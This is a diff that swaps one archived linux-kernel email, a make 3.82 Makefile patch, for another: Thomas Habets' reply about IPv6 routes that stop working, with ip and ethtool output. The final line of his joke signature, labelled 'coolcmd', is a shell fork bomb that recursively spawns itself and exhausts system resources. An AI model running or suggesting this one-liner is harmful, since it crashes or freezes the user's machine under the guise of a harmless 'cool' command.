@@ -1,62 +1,121 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753595Ab0HPK63 (ORCPT <rfc822;w@1wt.eu>);
-	Mon, 16 Aug 2010 06:58:29 -0400
-Received: from vpn.id2.novell.com ([195.33.99.129]:55640 "EHLO
-	vpn.id2.novell.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752899Ab0HPK62 convert rfc822-to-8bit (ORCPT
-	<rfc822;groupwise-JBeulich@novell.com:2:1>);
-	Mon, 16 Aug 2010 06:58:28 -0400
-Message-Id: <4C6936120200007800010064@vpn.id2.novell.com>
-X-Mailer: Novell GroupWise Internet Agent 8.0.1 
-Date: Mon, 16 Aug 2010 11:58:58 +0100
-From: "Jan Beulich" <JBeulich@novell.com>
-To: <sam@ravnborg.org>
-Cc: <linux-kernel@vger.kernel.org>
-Subject: [PATCH] fixes for using make 3.82
-Mime-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 8BIT
-Content-Disposition: inline
+	id S1753627Ab0HPK7v (ORCPT <rfc822;w@1wt.eu>);
+	Mon, 16 Aug 2010 06:59:51 -0400
+Received: from reptilian.habets.pp.se ([193.151.93.131]:1492 "EHLO
+	reptilian.habets.pp.se" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752925Ab0HPK7u (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Mon, 16 Aug 2010 06:59:50 -0400
+Date: Mon, 16 Aug 2010 12:59:44 +0200 (CEST)
+From: Thomas Habets <thomas@habets.pp.se>
+X-X-Sender: thompa@red.crap.retrofitta.se
+To: Eric Dumazet <eric.dumazet@gmail.com>
+cc: linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>,
+        Thomas Habets <thomas@habets.pp.se>
+Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
+ to reset
+In-Reply-To: <1281953960.2524.23.camel@edumazet-laptop>
+Message-ID: <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se>
+References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se> <1281953960.2524.23.camel@edumazet-laptop>
+User-Agent: Alpine 1.10 (DEB 962 2008-03-14)
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-It doesn't like pattern and explicit rules to be on the same line,
-and it seems to be more picky when matching file (or really directory)
-names with different numbers of trailing slashes.
+On Mon, 16 Aug 2010, Eric Dumazet wrote:
+>> $ ip -6 r sh
+>> 2a00:800:752:1::5c:0/112 dev eth0  proto kernel  metric 256  mtu 1500
+>> advmss 14 hoplimit 4294967295 unreachable
+>
+> advmss 14 ? or is it a copy/paste error ?
+> unreachable ?
 
-Signed-off-by: Jan Beulich <jbeulich@novell.com>
+Copy/paste error, sorry.
 
----
- firmware/Makefile  |    2 +-
- scripts/mkmakefile |    4 +++-
- 2 files changed, 4 insertions(+), 2 deletions(-)
+advmss 1440, and no "unreachable"
 
---- linux-2.6.36-rc1/firmware/Makefile
-+++ 2.6.36-rc1-make-3.82-fixes/firmware/Makefile
-@@ -142,7 +142,7 @@ fw-shipped-$(CONFIG_YAM) += yam/1200.bin
- fw-shipped-all := $(fw-shipped-y) $(fw-shipped-m) $(fw-shipped-)
- 
- # Directories which we _might_ need to create, so we have a rule for them.
--firmware-dirs := $(sort $(patsubst %,$(objtree)/$(obj)/%/,$(dir $(fw-external-y) $(fw-shipped-all))))
-+firmware-dirs := $(sort $(addprefix $(objtree)/$(obj)/,$(dir $(fw-external-y) $(fw-shipped-all))))
- 
- quiet_cmd_mkdir = MKDIR   $(patsubst $(objtree)/%,%,$@)
-       cmd_mkdir = mkdir -p $@
---- linux-2.6.36-rc1/scripts/mkmakefile
-+++ 2.6.36-rc1-make-3.82-fixes/scripts/mkmakefile
-@@ -44,7 +44,9 @@ all:
- 
- Makefile:;
- 
--\$(all) %/: all
-+\$(all): all
- 	@:
- 
-+%/: all
-+	@:
- EOF
+Complete (correct) line:
+
+2a00:800:752:1::5c:0/112 dev eth0 proto kernel metric 256 mtu 1500 advmss 
+1440 hoplimit 4294967295
+
+> This route seems wrong.
+
+Did you mean the below?
+
+>> 2a00:800:1000:64::1 dev lo proto kernel  metric 256  error -101 mtu 
+>> 16436 advmss 16376 hoplimit 4294967295
+
+Yes, that's where the "unreachable" belonged.
+
+unreachable 2a00:800:1000:64::1 dev lo proto kernel  metric 256  error 
+-101 mtu 1500 advmss 1440 hoplimit 4294967295
+
+That's an additional address on the lo interface, seen here again:
+
+>> 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436
+>>      inet6 2a00:800:1000:64::1/128 scope global
+>>         valid_lft forever preferred_lft forever
+>>      inet6 ::1/128 scope host
+>>         valid_lft forever preferred_lft forever
+
+Am I not allowed to add addresses to lo? That I've deconfigured this 
+address and rebooted the box to check if this matters.
+
+> I am wondering if you have some lowlevel problem, say lost frames in an
+> otherwise idle link, maybe a full/half duplex mismatch ?
+
+But at first it works perfectly, and then it doesn't work at all. The link 
+is ~idle both before and after, and IPv4 is unaffected. When I run "ip ne 
+del ..." it *immediately* starts working again. From 100% packet loss to 
+0%.
+
+Duplex is full according to dmesg and ethtool (mii-tool says 1000BaseT-HD, 
+but I suppose mii-tool is not as reliable?).
+
+Cisco router also says "Full-duplex, 1000Mb/s", so there doesn't seem to 
+be a mismatch. No errors in "show int giX/Y" either.
+
+ethtool info right after reboot (when ipv6 is still working):
+$ sudo ethtool eth0
+Settings for eth0:
+         Supported ports: [ TP ]
+         Supported link modes:   10baseT/Half 10baseT/Full
+                                 100baseT/Half 100baseT/Full
+                                 1000baseT/Half 1000baseT/Full
+         Supports auto-negotiation: Yes
+         Advertised link modes:  10baseT/Half 10baseT/Full
+                                 100baseT/Half 100baseT/Full
+                                 1000baseT/Half 1000baseT/Full
+         Advertised auto-negotiation: Yes
+         Speed: 1000Mb/s
+         Duplex: Full
+         Port: Twisted Pair
+         PHYAD: 1
+         Transceiver: internal
+         Auto-negotiation: on
+         Supports Wake-on: g
+         Wake-on: g
+         Current message level: 0x000000ff (255)
+         Link detected: yes
 
 
+No errors show in "ethtool -S eth0 | grep -v ': 0$'" now that it's 
+working.
 
+I will re-check ethtool and Cisco router output for mismatches when it 
+breaks again to make sure that there's no change or errors counting up.
+
+
+---------
+typedef struct me_s {
+   char name[]      = { "Thomas Habets" };
+   char email[]     = { "thomas@habets.pp.se" };
+   char kernel[]    = { "Linux" };
+   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
+   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
+   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
+} me_t;
